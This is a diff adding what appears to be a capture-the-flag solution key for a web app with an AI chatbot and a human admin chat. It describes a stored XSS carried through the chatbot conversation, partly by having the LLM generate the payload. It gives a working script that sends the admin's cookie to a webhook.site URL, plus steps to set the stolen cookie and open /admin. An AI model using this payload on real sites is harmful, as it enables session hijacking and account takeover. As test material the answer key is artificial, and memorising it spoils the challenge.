@@ -1,0 +1,33 @@
+Player won't get this
+
+---
+
+Modern web applications, including AI-driven chat systems, are often susceptible to various security vulnerabilities. In this particular application, a stored XSS (Cross-Site Scripting) vulnerability exists, exploiting one out of two chat interfaces: one for interacting with an AI chatbot and the other for conversing with a human (admin). While the bot's interface properly sanitizes inputs, the admin's interface does not. This lack of input sanitization in the admin interface opens up a path for attackers to launch stored XSS.
+
+A hacker could initiate a chat with the bot, embedding a malicious XSS payload in the conversation or ask the bot(LLM) to generate it. By requesting to "transfer [I need a human]" the chat to a human(admin), the application would load the bot chat for the admin, triggering the XSS vulnerability. This exploit could lead to the hijacking of the admin's session cookies, granting unauthorized access to the admin panel.
+
+The vulnerabilities within this application include:
+
+1. Inadequate System Prompt for the Bot: The chatbot lacks a secure prompt system to prevent discussions that could lead to code injection.
+2. Poor Input Sanitization: Insufficient input sanitization in the admin interface allows XSS payloads to be stored and executed, creating a significant security risk.
+3. Weak Cookie-Based Authentication: The application's cookie-based authentication is poorly implemented, making it easier for attackers to hijack sessions and gain unauthorized access.
+
+----
+
+[1] exploit
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://webhook.site/fd409f42-7615-4049-be4a-a03816ecd979?cookie=" + document.cookie, true);
+xhr.send();
+</script>
+
+Note - make sure to get your own webhook from - https://webhook.site/
+
+[2] - Now ask chatbot "I need a human" Which load the entire chat to admin , where has XSS, so you can hijack the admin cookie 
+
+[3] set cookie
+document.cookie='admin_cookie=hZGt3vIXhopk72eY'
+(you will see the admin cookie in webhook.site as a GET)
+
+[4] go /admin, then get the flag
